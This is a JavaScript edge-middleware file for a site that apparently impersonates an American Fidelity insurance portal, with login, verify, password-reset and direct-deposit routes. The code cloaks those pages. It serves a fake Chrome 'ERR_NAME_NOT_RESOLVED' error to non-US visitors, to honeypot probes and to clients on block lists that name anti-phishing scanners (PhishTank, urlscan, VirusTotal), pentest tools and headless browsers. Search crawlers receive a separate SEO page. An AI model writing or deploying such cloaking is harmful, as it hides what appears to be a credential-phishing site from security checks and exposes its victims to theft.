var ROUTES = {
  '/': 'index.html',
  '/login': 'login.html',
  '/register': 'register.html',
  '/benefits-guide': 'benefits-guide.html',
  '/claims-help': 'claims-help.html',
  '/faq-af': 'faq-af.html',
  '/security-af': 'security-af.html',
  '/contact-af': 'contact-af.html',
  '/dashboard': 'dashboard.html',
  '/verify': 'verify.html',
  '/disability-insurance': 'disability-insurance.html',
  '/cancer-insurance': 'cancer-insurance.html',
  '/critical-illness-insurance': 'critical-illness-insurance.html',
  '/hospital-indemnity-insurance': 'hospital-indemnity-insurance.html',
  '/accident-insurance': 'accident-insurance.html',
  '/life-insurance': 'life-insurance.html',
  '/is-american-fidelity-the-same-as-fidelity': 'is-american-fidelity-the-same-as-fidelity.html',
  '/american-fidelity-vs-aflac': 'american-fidelity-vs-aflac.html',
  '/american-fidelity-vs-colonial-life': 'american-fidelity-vs-colonial-life.html',
  '/std-vs-ltd': 'std-vs-ltd.html',
  '/term-vs-whole-life': 'term-vs-whole-life.html',
  '/how-to-file-disability-claim': 'how-to-file-disability-claim.html',
  '/how-to-file-cancer-claim': 'how-to-file-cancer-claim.html',
  '/how-to-file-accident-claim': 'how-to-file-accident-claim.html',
  '/glossary': 'glossary.html',
  '/open-enrollment': 'open-enrollment.html',
  '/section-125-cafeteria-plan': 'section-125-cafeteria-plan.html',
  '/about-american-fidelity': 'about-american-fidelity.html',
  '/privacy': 'privacy.html',
  '/login-help': 'login-help.html',
  '/password-reset': 'password-reset.html',
  '/forgot-username': 'forgot-username.html',
  '/employer-login': 'employer-login.html',
  '/mobile-app': 'mobile-app.html',
  '/claim-status': 'claim-status.html',
  '/claim-processing-time': 'claim-processing-time.html',
  '/upload-claim-documents': 'upload-claim-documents.html',
  '/direct-deposit': 'direct-deposit.html',
  '/reimbursement-claim': 'reimbursement-claim.html',
};

var CANONICAL_MAP = {
  '/index': '/',
  '/index.html': '/',
  '/login.html': '/login',
  '/register.html': '/register',
  '/benefits-guide.html': '/benefits-guide',
  '/claims-help.html': '/claims-help',
  '/faq-af.html': '/faq-af',
  '/security-af.html': '/security-af',
  '/contact-af.html': '/contact-af',
  '/dashboard.html': '/dashboard',
  '/verify.html': '/verify',
  '/seo': '/',
  '/seo.html': '/',
  '/disability-insurance.html': '/disability-insurance',
  '/cancer-insurance.html': '/cancer-insurance',
  '/critical-illness-insurance.html': '/critical-illness-insurance',
  '/hospital-indemnity-insurance.html': '/hospital-indemnity-insurance',
  '/accident-insurance.html': '/accident-insurance',
  '/life-insurance.html': '/life-insurance',
  '/is-american-fidelity-the-same-as-fidelity.html': '/is-american-fidelity-the-same-as-fidelity',
  '/american-fidelity-vs-aflac.html': '/american-fidelity-vs-aflac',
  '/american-fidelity-vs-colonial-life.html': '/american-fidelity-vs-colonial-life',
  '/std-vs-ltd.html': '/std-vs-ltd',
  '/term-vs-whole-life.html': '/term-vs-whole-life',
  '/how-to-file-disability-claim.html': '/how-to-file-disability-claim',
  '/how-to-file-cancer-claim.html': '/how-to-file-cancer-claim',
  '/how-to-file-accident-claim.html': '/how-to-file-accident-claim',
  '/glossary.html': '/glossary',
  '/open-enrollment.html': '/open-enrollment',
  '/section-125-cafeteria-plan.html': '/section-125-cafeteria-plan',
  '/about-american-fidelity.html': '/about-american-fidelity',
  '/privacy.html': '/privacy',
  '/login-help.html': '/login-help',
  '/password-reset.html': '/password-reset',
  '/forgot-username.html': '/forgot-username',
  '/employer-login.html': '/employer-login',
  '/mobile-app.html': '/mobile-app',
  '/claim-status.html': '/claim-status',
  '/claim-processing-time.html': '/claim-processing-time',
  '/upload-claim-documents.html': '/upload-claim-documents',
  '/direct-deposit.html': '/direct-deposit',
  '/reimbursement-claim.html': '/reimbursement-claim',
};

var GATED_PATHS = {
  '/': true,
  '/login': true,
  '/register': true,
  '/dashboard': true,
  '/verify': true,
  '/login-help': true,
  '/password-reset': true,
  '/forgot-username': true,
  '/employer-login': true,
  '/mobile-app': true,
};

var HONEYPOT_PATHS = {
  '/admin-portal': true,
  '/wp-admin': true,
  '/wp-login.php': true,
  '/.env': true,
  '/config.json': true,
  '/debug': true,
  '/phpinfo.php': true,
  '/server-status': true,
  '/.git': true,
  '/.git/config': true,
  '/wp-config.php': true,
  '/xmlrpc.php': true,
  '/administrator': true,
  '/backup': true,
  '/phpmyadmin': true,
};

var SECURITY_HEADERS = {
  'X-Robots-Tag': 'noai, noimageai',
  'X-Frame-Options': 'DENY',
  'X-Content-Type-Options': 'nosniff',
  'Referrer-Policy': 'strict-origin-when-cross-origin',
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
};

var BLOCKED_TOOL_UAS = /curl|wget|httpie|python-requests|python-urllib|python\/|aiohttp|httpx|requests\/|scrapy|urllib3|node-fetch|axios|got\/|undici|superagent|needle|request\/|postman|insomnia|paw\/|restsharp|okhttp|retrofit|apache-httpclient|java\/|libwww-perl|lwp-|mechanize|www-mechanize|perl\/|php\/|guzzle|symfony|laravel|drupal|wordpress|ruby|faraday|typhoeus|httparty|rest-client|go-http-client|fasthttp|colly|resty|winhttp|powershell|invoke-webrequest|fetch\/|deno\/|bun\//i;

var BLOCKED_SCANNER_UAS = /nuclei|sqlmap|nikto|nessus|openvas|masscan|zgrab|zmap|nmap|wpscan|dirbuster|gobuster|ffuf|httpx-toolkit|katana|burpsuite|burp|acunetix|qualys|rapid7|shodan|censys|zoomeye|binaryedge|whatweb|w3af|arachni|skipfish|feroxbuster|dirsearch|wfuzz|amass|subfinder|assetfinder|hakrawler|gau|waybackurls|arjun|paramspider|dalfox|xsstrike|commix|tplmap|crlfuzz|smuggler|headi|corsy|secretfinder|linkfinder|getjs|subjs|socialhunter|photon|uro|qsreplace|anew|interactsh|interact\.sh|cariddi|gospider|meg\/|rush\/|jaeles|xray|vulners|detectify|pentest|securitytrails|spyse/i;

var BLOCKED_SEO_CRAWLERS = /semrushbot|ahrefsbot|ahrefssiteaudit|mj12bot|dotbot|rogerbot|megaindex|blexbot|netcraft|seokicks|siteexplorer|serpstat|sistrix|screaming|deepcrawl|oncrawl|botify|lumar|contentkingbot|seobilitybot|seostar|searchmetricsbot|majestic|linkdex|exabot|sogou|360spider|bytedance|tiktokbot|ia_archiver|archive\.org_bot|alexa/i;

var BLOCKED_HEADLESS = /headlesschrome|phantomjs|selenium|puppeteer|playwright|cypress|webdriver|httrack|slimerjs|splash|nightmare|zombiejs|cheerio|jsdom|htmlunit|rhino|nashorn|casperjs|watir|capybara|ghost\.py|dryscrape|robobrowser|mechanicalsoup|grab|twill|splinter|windmill/i;

var BLOCKED_AI_TRAIN = /gptbot|anthropic-ai|claudebot|cohere-ai|ccbot|diffbot|commoncrawl|common-crawl|amazonbot|bytespider|google-extended|applebot-extended|imagesiftbot|omgili|meta-externalagent/i;

var BLOCKED_SECURITY_SCANNERS = /norton.*safeweb|safeweb|mcafee.*siteadvisor|siteadvisor|bitdefender.*trafficlight|trafficlight|phishtank|urlscan\.io|urlscan|virustotal/i;

var TRUSTED_CRAWLERS = /googlebot|google-inspectiontool|google-site-verification|google-structured-data-testing-tool|googleother|google-agent|apis-google|feedfetcher-google|mediapartners-google|adsbot-google|storebot-google|google-read-aloud|google-favicon|bingbot|bingpreview|msnbot|msnbot-media|duckduckbot|applebot|slurp|yahoo|yandexbot|yandeximages|baiduspider|seznambot|yeti|naverbot|bravebot|qwantify|petalbot|gigabot|teoma/i;

var AI_ANSWER_ENGINES = /chatgpt-user|oai-searchbot|perplexitybot|perplexity-user|claude-user|claude-searchbot|duckassistbot|youbot|meta-externalfetcher/i;

var SOCIAL_CRAWLERS = /facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterestbot|slackbot|discordbot|whatsapp|telegrambot|skypeuripreview|viber|snapchat|embedly|redditbot/i;

var SEARCH_REFERRERS = /google\.|google\.com|bing\.|yahoo\.|duckduckgo\.|ddg\.gg|baidu\.|yandex\.|ecosia\.|startpage\.|ask\.|aol\.|search\.|perplexity\.ai|you\.com|chatgpt\.com|googleusercontent|discover|news\.google|apps\.google/i;

var GATE_COOKIE = '__af_gate';

function addHeaders(response) {
  var resp = new Response(response.body, response);
  for (var key in SECURITY_HEADERS) {
    resp.headers.set(key, SECURITY_HEADERS[key]);
  }
  resp.headers.set('Vary', 'User-Agent');
  resp.headers.set('CDN-Cache-Control', 'no-store');
  return resp;
}

function buildErrorPage(hostname) {
  return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="noindex,nofollow"><title>' + hostname + '</title><style>:root{--ink:#3c4043;--body:#5f6368;--muted:#80868b;--bullet:#9aa0a6;--bg:#fff;--blue:#1a73e8;--blue-press:#1765cc;--btn-border:#dadce0;--btn-ink:#3c4043}*{box-sizing:border-box}html,body{margin:0;padding:0;height:100%}body{background:var(--bg);color:var(--body);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}.wrap{min-height:100%;display:flex;justify-content:center;align-items:flex-start;padding:0 24px}.card{width:100%;max-width:560px;margin-top:96px}.icon{width:96px;height:96px;margin:0 0 28px;display:block}h1{color:var(--ink);font-size:24px;font-weight:500;line-height:1.33;margin:0 0 16px}.lead{font-size:15px;line-height:1.6;margin:0 0 28px;color:var(--body);overflow-wrap:anywhere}.try{font-size:15px;color:var(--body);margin:0 0 10px}ul.try-list{list-style:none;margin:0 0 32px;padding:0 0 0 4px}ul.try-list li{position:relative;padding-left:22px;font-size:15px;line-height:1.7;color:var(--body)}ul.try-list li::before{content:"";position:absolute;left:2px;top:.55em;width:6px;height:6px;border-radius:50%;background:var(--bullet)}.err{font-family:Roboto,monospace;font-size:13px;letter-spacing:.4px;color:var(--muted);margin:0 0 28px}.actions{display:flex;align-items:center;gap:12px;justify-content:space-between}.btn{appearance:none;border:1px solid transparent;border-radius:4px;font-family:inherit;font-size:14px;font-weight:500;line-height:1;padding:10px 20px;cursor:pointer;text-decoration:none;display:inline-block}.btn-reload{background:var(--blue);color:#fff}.btn-reload:active{background:var(--blue-press)}.btn-details{background:#fff;color:var(--btn-ink);border-color:var(--btn-border)}.btn-details:active{background:#f1f3f4}@media(max-width:600px){.card{margin-top:48px}.icon{width:72px;height:72px;margin-bottom:20px}h1{font-size:20px}.lead,.try,ul.try-list li{font-size:14px}.actions{flex-direction:column-reverse;align-items:stretch;gap:10px}.btn{width:100%;text-align:center;padding:12px 16px}}@media(prefers-color-scheme:dark){:root{--ink:#e8eaed;--body:#9aa0a6;--muted:#80868b;--bullet:#5f6368;--bg:#202124;--btn-ink:#e8eaed;--btn-border:#5f6368}}</style></head><body><div class="wrap"><div class="card"><span class="icon"><svg width="100%" height="100%" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M24 26h42l24 24v36a12 12 0 0 1-12 12H24a12 12 0 0 1-12-12V38a12 12 0 0 1 12-12z" fill="#e8eaed" stroke="#9aa0a6" stroke-width="4"/><path d="M66 26v16a8 8 0 0 0 8 8h16" fill="none" stroke="#9aa0a6" stroke-width="4"/><circle cx="46" cy="68" r="5.5" fill="#80868b"/><circle cx="76" cy="68" r="5.5" fill="#80868b"/><path d="M48 92c4.5-8 23.5-8 28 0" fill="none" stroke="#80868b" stroke-width="4" stroke-linecap="round"/></svg></span><h1>This site can\'t be reached</h1><p class="lead">' + hostname + '\'s server IP address could not be found.</p><p class="try">Try:</p><ul class="try-list"><li>Checking the connection</li><li>Checking the proxy, firewall and DNS configuration</li><li>Running Windows Network Diagnostics</li></ul><p class="err">ERR_NAME_NOT_RESOLVED</p><div class="actions"><a class="btn btn-reload" href="javascript:location.reload()">Reload</a><button class="btn btn-details" type="button" onclick="this.nextElementSibling.style.display=\'block\'">Details</button><div style="display:none;font-size:12px;color:var(--muted);line-height:1.5;margin-top:8px">Chrome tried to connect to ' + hostname + ', but this site\'s server IP address could not be found.</div></div></div></div></body></html>';
}

function buildGatePage(hostname, pathname) {
  var base = buildErrorPage(hostname);
  var link = pathname + '?bypass=1';
  var insert = '<div style="margin-top:24px;text-align:center"><a href="' + link + '" style="color:var(--blue);font-size:13px;text-decoration:none">Continue to the portal anyway &rarr;</a></div>';
  return base.replace('</div></div></div></body>', insert + '</div></div></div></body>');
}

function hasGateCookie(request) {
  var cookie = request.headers.get('cookie') || '';
  return cookie.indexOf(GATE_COOKIE) !== -1;
}

function setGateCookie(response) {
  var resp = new Response(response.body, response);
  resp.headers.append('Set-Cookie', GATE_COOKIE + '=1; Path=/; Max-Age=2592000; Secure; HttpOnly; SameSite=Lax');
  return resp;
}

function isBlockedBot(ua) {
  if (!ua || ua.length < 10) return true;
  if (TRUSTED_CRAWLERS.test(ua)) return false;
  if (AI_ANSWER_ENGINES.test(ua)) return false;
  if (SOCIAL_CRAWLERS.test(ua)) return false;
  if (BLOCKED_TOOL_UAS.test(ua)) return true;
  if (BLOCKED_SCANNER_UAS.test(ua)) return true;
  if (BLOCKED_SEO_CRAWLERS.test(ua)) return true;
  if (BLOCKED_HEADLESS.test(ua)) return true;
  if (BLOCKED_AI_TRAIN.test(ua)) return true;
  if (BLOCKED_SECURITY_SCANNERS.test(ua)) return true;
  if (!/mozilla|chrome|safari|firefox|edge|opera|msie|trident/i.test(ua)) return true;
  return false;
}

export async function onRequest(context) {
  var request = context.request;
  var env = context.env;
  var next = context.next;
  var url = new URL(request.url);
  var pathname = url.pathname.replace(/\/+$/, '') || '/';
  var ua = request.headers.get('user-agent') || '';

  if (pathname.startsWith('/api/')) {
    var response = await next();
    return addHeaders(response);
  }

  if (pathname.includes('.') && !ROUTES[pathname] && !CANONICAL_MAP[pathname] && !HONEYPOT_PATHS[pathname]) {
    var response = await next();
    return addHeaders(response);
  }

  if (CANONICAL_MAP[pathname]) {
    return Response.redirect(new URL(CANONICAL_MAP[pathname], request.url).toString(), 301);
  }

  if (HONEYPOT_PATHS[pathname]) {
    return new Response(buildErrorPage(url.hostname), {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
    });
  }

  if (isBlockedBot(ua)) {
    return new Response(buildErrorPage(url.hostname), {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
    });
  }

  if (!ROUTES[pathname] && !pathname.includes('.')) {
    try {
      var notFoundUrl = new URL('/404.html', request.url);
      var notFoundResp = await env.ASSETS.fetch(notFoundUrl);
      if (notFoundResp.ok) {
        return addHeaders(new Response(notFoundResp.body, {
          status: 404,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        }));
      }
    } catch (e) {}
    return addHeaders(new Response(buildErrorPage(url.hostname), {
      status: 404,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    }));
  }

  if (GATED_PATHS[pathname]) {
    var referer = request.headers.get('referer') || '';
    var host = request.headers.get('host') || '';
    var country = (request.cf && request.cf.country) || '';

    var isTrustedCrawler = TRUSTED_CRAWLERS.test(ua);
    var isAnswerEngine = AI_ANSWER_ENGINES.test(ua);
    var isFromSearch = SEARCH_REFERRERS.test(referer);
    var isInternal = host && referer.indexOf(host) !== -1;
    var hasCookie = hasGateCookie(request);

    if (isTrustedCrawler || isAnswerEngine) {
      try {
        var seoUrl = new URL('/seo.html', request.url);
        var seoResp = await env.ASSETS.fetch(seoUrl);
        if (seoResp.ok) {
          return addHeaders(new Response(seoResp.body, {
            status: 200,
            headers: { 'Content-Type': 'text/html; charset=utf-8' },
          }));
        }
      } catch (e) {}
    }

    var gateEnabled = String(env.GATE_ENABLED || 'on').toLowerCase() !== 'off';
    var referrerGateOn = String(env.GATE_REFERRER || 'on').toLowerCase() !== 'off';

    if (gateEnabled && !isTrustedCrawler && !isAnswerEngine) {
      if (country && country !== 'US') {
        return new Response(buildErrorPage(url.hostname), {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        });
      }
      if (referrerGateOn && !hasCookie && !isFromSearch && !isInternal) {
        if (url.searchParams.get('bypass') === '1') {
          // User clicked "Continue to the portal anyway" — set cookie and proceed
        } else {
          return new Response(buildGatePage(url.hostname, pathname), {
            status: 200,
            headers: { 'Content-Type': 'text/html; charset=utf-8' },
          });
        }
      }
    }
  }

  var response = await next();
  var finalResp = addHeaders(response);

  if (GATED_PATHS[pathname] && !hasGateCookie(request)) {
    finalResp = setGateCookie(finalResp);
  }

  return finalResp;
}
